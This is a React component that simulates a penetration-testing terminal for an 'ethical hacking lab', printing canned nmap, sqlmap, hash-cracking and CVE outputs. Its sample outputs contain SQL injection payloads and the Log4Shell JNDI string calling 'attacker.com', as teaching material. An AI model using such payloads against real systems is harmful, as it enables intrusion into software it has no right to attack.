import React, { useState, useRef, useEffect } from 'react';
import { Terminal as TerminalIcon, ShieldAlert, CheckCircle, HelpCircle, Play, CornerDownLeft, Sparkles, RefreshCw } from 'lucide-react';
import { COMMON_PORTS } from '../data/ethicalHackingData';

interface TerminalLine {
  id: string;
  type: 'input' | 'output' | 'error' | 'success' | 'system' | 'banner';
  text: string;
}

export const Terminal: React.FC = () => {
  const [lines, setLines] = useState<TerminalLine[]>([
    {
      id: 'banner-1',
      type: 'banner',
      text: `
  ███████╗████████╗██╗  ██╗██╗ ██████╗ █████╗ ██╗         ██╗      █████╗ ██████╗ 
  ██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔══██╗██║         ██║     ██╔══██╗██╔══██╗
  █████╗     ██║   ███████║██║██║     ███████║██║         ██║     ███████║██████╔╝
  ██╔══╝     ██║   ██╔══██║██║██║     ██╔══██║██║         ██║     ██╔══██║██╔══██╗
  ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗    ███████╗██║  ██║██████╔╝
  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═════╝ 
      [ ETHICAL HACKING LAB v2.4 // AUTHORIZED SECURITY RESEARCH ENCLAVE ]
      Type "help" for a list of available cyber commands or "scan" to probe.
      `
    },
    {
      id: 'init-msg',
      type: 'system',
      text: 'Session authenticated. Terminal environment initialized in defensive research mode.'
    }
  ]);

  const [inputVal, setInputVal] = useState('');
  const [history, setHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState<number>(-1);
  const [isProcessing, setIsProcessing] = useState(false);
  const terminalBottomRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    terminalBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [lines]);

  const handleCommand = async (rawCmd: string) => {
    const trimmed = rawCmd.trim();
    if (!trimmed) return;

    // Record history
    setHistory((prev) => [...prev, trimmed]);
    setHistoryIndex(-1);

    const inputLine: TerminalLine = {
      id: Math.random().toString(36),
      type: 'input',
      text: `pentester@sec-lab:~$ ${trimmed}`
    };

    setLines((prev) => [...prev, inputLine]);
    setInputVal('');

    const [cmd, ...args] = trimmed.split(' ');
    const commandLower = cmd.toLowerCase();

    setIsProcessing(true);

    // Simulate realistic execution timing
    setTimeout(() => {
      executeCommand(commandLower, args, trimmed);
      setIsProcessing(false);
    }, 200);
  };

  const executeCommand = (cmd: string, args: string[], fullInput: string) => {
    let outputLines: TerminalLine[] = [];

    switch (cmd) {
      case 'help':
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'system',
            text: `Available Penetration Testing & Recon Commands:
  • help                - Show this command reference
  • clear               - Clear the terminal screen
  • whois <domain>      - Perform simulated WHOIS domain registry query
  • nmap <target>       - Probe open ports, services, and security posture
  • sqlmap <target>     - Test SQL injection vulnerability against an endpoint
  • hashid <hash>       - Identify hash algorithm (MD5, SHA-256, bcrypt, etc.)
  • crack <hash>        - Attempt dictionary crack on common weak hashes
  • ports               - Display high-risk common attack ports
  • cve <id>            - Query CVE vulnerability database (e.g. CVE-2021-44228)
  • status              - Inspect security testing environment parameters
  • echo <message>      - Output text to console
  • date                - Print current system timestamp`
          }
        ];
        break;

      case 'clear':
        setLines([]);
        return;

      case 'date':
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'output',
            text: new Date().toUTCString()
          }
        ];
        break;

      case 'echo':
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'output',
            text: args.join(' ')
          }
        ];
        break;

      case 'status':
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'success',
            text: `[+] Defensive Lab Status: ONLINE
[+] Kernel: Linux 6.8.0-kali-amd64
[+] Proxy: Transparent SOCKS5 (Active)
[+] Honeypot Guard: Active
[+] Audit Logging: Enabled (/var/log/audit/sec-lab.log)`
          }
        ];
        break;

      case 'whois': {
        const domain = args[0] || 'target-system.org';
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'output',
            text: `[Querying WHOIS for ${domain}...]
Domain Name: ${domain.toUpperCase()}
Registry Domain ID: 298491823_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.registrar-safe.net
Registrar URL: http://www.registrar-safe.net
Creation Date: 2018-04-12T14:22:01Z
Updated Date: 2024-01-19T09:12:44Z
Registry Expiry Date: 2028-04-12T14:22:01Z
Registrant Organization: Privacy Protection Corp
Name Server: NS1.CLOUDFLARE.COM
Name Server: NS2.CLOUDFLARE.COM
DNSSEC: unsigned
Status: clientTransferProhibited`
          }
        ];
        break;
      }

      case 'nmap': {
        const target = args[0] || '192.168.1.55';
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'system',
            text: `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleTimeString()}
Initiating SYN Stealth Scan against ${target}
Scanning ${target} [1000 ports]
Discovered open port 22/tcp on ${target}
Discovered open port 80/tcp on ${target}
Discovered open port 443/tcp on ${target}
Discovered open port 3306/tcp on ${target}
Completed SYN Stealth Scan in 1.42s

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Protocol 2.0)
80/tcp   open  http         Apache httpd 2.4.52 ((Ubuntu))
443/tcp  open  ssl/http     Apache httpd 2.4.52 ((Ubuntu))
3306/tcp open  mysql        MySQL 8.0.35-0ubuntu0.22.04.1
| mysql-info: 
|_  Protocol: 10, Version: 8.0.35, Capabilities: Supports 4.1 protocol

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds`
          },
          {
            id: Math.random().toString(36),
            type: 'success',
            text: '[*] Scan completed. Detected 4 exposed services. Port 3306 (MySQL) should NOT be exposed to public networks.'
          }
        ];
        break;
      }

      case 'sqlmap': {
        const url = args.join(' ') || 'http://target.com/item?id=1';
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'output',
            text: `[*] starting @ ${new Date().toLocaleTimeString()}
[INFO] testing connection to the target URL: ${url}
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] confirming that GET parameter 'id' is dynamic
[+] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[+] Parameter 'id' is vulnerable:
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8821=8821
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT('SQLMAP_TEST',0x7170707a71)-- -
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.52, PHP 8.1.2`
          },
          {
            id: Math.random().toString(36),
            type: 'success',
            text: '[!] VULNERABILITY CONFIRMED: Parameter "id" allows SQL injection. Mitigation: Use Prepared Statements (PDO).'
          }
        ];
        break;
      }

      case 'hashid': {
        const hash = args[0];
        if (!hash) {
          outputLines = [{ id: Math.random().toString(36), type: 'error', text: 'Usage: hashid <hash-string>' }];
          break;
        }

        let identified = 'Unknown';
        if (hash.length === 32 && /^[a-fA-F0-9]+$/.test(hash)) {
          identified = 'MD5 / NTLM / MD4 (128-bit hash)';
        } else if (hash.length === 40 && /^[a-fA-F0-9]+$/.test(hash)) {
          identified = 'SHA-1 / RIPEMD-160 (160-bit hash)';
        } else if (hash.length === 64 && /^[a-fA-F0-9]+$/.test(hash)) {
          identified = 'SHA-256 / SHA3-256 (256-bit hash)';
        } else if (hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$')) {
          identified = 'bcrypt (Blowfish-based adaptive key derivation)';
        } else if (hash.startsWith('$argon2')) {
          identified = 'Argon2 (Password Hashing Competition Winner)';
        }

        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'output',
            text: `Analyzing hash: ${hash}
Length: ${hash.length} characters
Probable Algorithm: ${identified}`
          }
        ];
        break;
      }

      case 'crack': {
        const hash = (args[0] || '').toLowerCase();
        if (!hash) {
          outputLines = [{ id: Math.random().toString(36), type: 'error', text: 'Usage: crack <md5_or_sha256_hash>' }];
          break;
        }

        const commonRainbow: Record<string, string> = {
          '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
          'e10adc3949ba59abbe56e057f20f883e': '123456',
          '25d55ad283aa400af464c76d713c07ad': '12345678',
          '21232f297a57a5a743894a0e4a801fc3': 'admin',
          '827ccb0eea8a706c4c34a16891f84e7b': '12345',
          'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f': 'password123'
        };

        if (commonRainbow[hash]) {
          outputLines = [
            {
              id: Math.random().toString(36),
              type: 'system',
              text: `[*] Loaded dictionary: rockyou.txt (14,344,392 entries)
[*] Running CPU dictionary attack...
[*] Match found in block #1!`
            },
            {
              id: Math.random().toString(36),
              type: 'success',
              text: `[+] HASH CRACKED!
    Target Hash: ${hash}
    Plaintext:   ${commonRainbow[hash]}
    Technique:   Rainbow Table / Common Wordlist Match`
            }
          ];
        } else {
          outputLines = [
            {
              id: Math.random().toString(36),
              type: 'error',
              text: `[-] Hash not found in standard dictionary of common passwords.
    Hash might use high-entropy salt or work-factor (e.g. bcrypt).`
            }
          ];
        }
        break;
      }

      case 'ports': {
        const portSummary = COMMON_PORTS.slice(0, 8).map(
          (p) => `Port ${p.port}/${p.transport.toLowerCase()} [${p.risk} Risk] - ${p.service}: ${p.description}`
        ).join('\n');
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'output',
            text: `High-Risk Common Ports & Attack Vectors:\n${portSummary}`
          }
        ];
        break;
      }

      case 'cve': {
        const cve = (args[0] || '').toUpperCase();
        if (cve.includes('44228') || cve.includes('LOG4SHELL')) {
          outputLines = [
            {
              id: Math.random().toString(36),
              type: 'output',
              text: `CVE-2021-44228 [Log4Shell]
Severity: CVSS 10.0 (CRITICAL)
Product: Apache Log4j2 versions 2.0-beta9 through 2.14.1
Vulnerability: JNDI lookup injection allows Remote Code Execution (RCE).
Attack String: \${jndi:ldap://attacker.com/a}
Fix: Upgrade to Log4j 2.17.1+ or set log4j2.formatMsgNoLookups=true.`
            }
          ];
        } else if (cve.includes('5638') || cve.includes('EQUIFAX')) {
          outputLines = [
            {
              id: Math.random().toString(36),
              type: 'output',
              text: `CVE-2017-5638 [Apache Struts 2 RCE]
Severity: CVSS 9.8 (CRITICAL)
Impact: Led to the 2017 Equifax data breach (147M records).
Vulnerability: Improper parsing of the Content-Type HTTP header using OGNL expressions.
Fix: Upgrade to Apache Struts 2.3.32 or 2.5.10.1.`
            }
          ];
        } else {
          outputLines = [
            {
              id: Math.random().toString(36),
              type: 'system',
              text: `Querying National Vulnerability Database (NVD) for ${cve || 'generic vulnerability'}...
CVE: ${cve || 'CVE-2023-38606'}
Status: Analyzed
Base Score: 9.8 CRITICAL
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Recommendation: Apply vendor security advisory patch immediately.`
            }
          ];
        }
        break;
      }

      default:
        outputLines = [
          {
            id: Math.random().toString(36),
            type: 'error',
            text: `Command not found: "${cmd}". Type "help" to see available ethical hacking commands.`
          }
        ];
        break;
    }

    setLines((prev) => [...prev, ...outputLines]);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      handleCommand(inputVal);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (history.length === 0) return;
      const nextIdx = historyIndex === -1 ? history.length - 1 : Math.max(0, historyIndex - 1);
      setHistoryIndex(nextIdx);
      setInputVal(history[nextIdx]);
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex === -1) return;
      const nextIdx = historyIndex + 1;
      if (nextIdx >= history.length) {
        setHistoryIndex(-1);
        setInputVal('');
      } else {
        setHistoryIndex(nextIdx);
        setInputVal(history[nextIdx]);
      }
    }
  };

  const quickCommands = [
    { label: 'help', cmd: 'help' },
    { label: 'nmap scan', cmd: 'nmap 192.168.1.1' },
    { label: 'sqlmap test', cmd: 'sqlmap http://bank.test/account?id=42' },
    { label: 'crack hash', cmd: 'crack 5f4dcc3b5aa765d61d8327deb882cf99' },
    { label: 'cve lookup', cmd: 'cve CVE-2021-44228' },
    { label: 'ports check', cmd: 'ports' }
  ];

  return (
    <div className="flex flex-col h-full bg-slate-950 border border-slate-800 rounded-xl overflow-hidden shadow-2xl font-mono text-sm">
      {/* Terminal Title Bar */}
      <div className="flex items-center justify-between px-4 py-2.5 bg-slate-900 border-b border-slate-800 select-none">
        <div className="flex items-center space-x-2">
          <div className="w-3 h-3 rounded-full bg-red-500/80 hover:bg-red-400 cursor-pointer" />
          <div className="w-3 h-3 rounded-full bg-amber-500/80 hover:bg-amber-400 cursor-pointer" />
          <div className="w-3 h-3 rounded-full bg-emerald-500/80 hover:bg-emerald-400 cursor-pointer" />
          <span className="ml-2 text-xs font-semibold text-slate-400 flex items-center gap-1.5">
            <TerminalIcon className="w-3.5 h-3.5 text-emerald-400" />
            bash — pentester@sec-lab:~ (80x24)
          </span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-[11px] px-2 py-0.5 rounded bg-emerald-950/80 text-emerald-400 border border-emerald-800">
            SANDBOX MODE
          </span>
          <button
            onClick={() => handleCommand('clear')}
            className="text-xs text-slate-400 hover:text-slate-200 transition-colors px-2 py-1 rounded hover:bg-slate-800 flex items-center gap-1"
            title="Clear screen"
          >
            <RefreshCw className="w-3 h-3" />
            Clear
          </button>
        </div>
      </div>

      {/* Quick Launch Buttons */}
      <div className="bg-slate-900/60 px-4 py-2 border-b border-slate-800/80 flex flex-wrap items-center gap-2 text-xs">
        <span className="text-slate-500 text-[11px] uppercase tracking-wider font-semibold">Quick Commands:</span>
        {quickCommands.map((q) => (
          <button
            key={q.label}
            onClick={() => handleCommand(q.cmd)}
            className="px-2.5 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-emerald-400 rounded border border-slate-700/60 transition-colors flex items-center gap-1 text-xs"
          >
            <Play className="w-2.5 h-2.5 text-emerald-400" />
            {q.label}
          </button>
        ))}
      </div>

      {/* Terminal Screen Output */}
      <div
        className="flex-1 p-4 overflow-y-auto space-y-2 select-text text-slate-300 leading-relaxed max-h-[500px]"
        onClick={() => inputRef.current?.focus()}
      >
        {lines.map((l) => {
          if (l.type === 'banner') {
            return (
              <pre
                key={l.id}
                className="text-emerald-400 text-[11px] leading-tight font-bold overflow-x-auto select-none"
              >
                {l.text}
              </pre>
            );
          }
          if (l.type === 'input') {
            return (
              <div key={l.id} className="text-slate-200 font-semibold flex items-start gap-1">
                <span>{l.text}</span>
              </div>
            );
          }
          if (l.type === 'error') {
            return (
              <div key={l.id} className="text-rose-400 whitespace-pre-wrap pl-2 border-l-2 border-rose-500/50">
                {l.text}
              </div>
            );
          }
          if (l.type === 'success') {
            return (
              <div key={l.id} className="text-emerald-400 whitespace-pre-wrap pl-2 border-l-2 border-emerald-500/50">
                {l.text}
              </div>
            );
          }
          if (l.type === 'system') {
            return (
              <div key={l.id} className="text-cyan-300 whitespace-pre-wrap">
                {l.text}
              </div>
            );
          }
          return (
            <div key={l.id} className="text-slate-300 whitespace-pre-wrap">
              {l.text}
            </div>
          );
        })}
        {isProcessing && (
          <div className="text-emerald-400 flex items-center gap-2 py-1">
            <span className="animate-spin inline-block w-3 h-3 border-2 border-emerald-400 border-t-transparent rounded-full" />
            <span className="text-xs">Executing command...</span>
          </div>
        )}
        <div ref={terminalBottomRef} />
      </div>

      {/* Terminal Input Line */}
      <div className="px-4 py-3 bg-slate-900 border-t border-slate-800 flex items-center gap-2">
        <span className="text-emerald-400 font-bold select-none text-xs sm:text-sm">pentester@sec-lab:~$</span>
        <input
          ref={inputRef}
          type="text"
          value={inputVal}
          onChange={(e) => setInputVal(e.target.value)}
          onKeyDown={handleKeyDown}
          placeholder="Type command (e.g. 'nmap target', 'help', 'crack <hash>')..."
          className="flex-1 bg-transparent text-slate-100 focus:outline-none text-sm placeholder:text-slate-600 caret-emerald-400 font-mono"
          autoFocus
        />
        <button
          onClick={() => handleCommand(inputVal)}
          disabled={!inputVal.trim() || isProcessing}
          className="px-3 py-1 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-40 text-slate-950 font-bold rounded text-xs transition-colors flex items-center gap-1"
        >
          <CornerDownLeft className="w-3 h-3" />
          Run
        </button>
      </div>
    </div>
  );
};
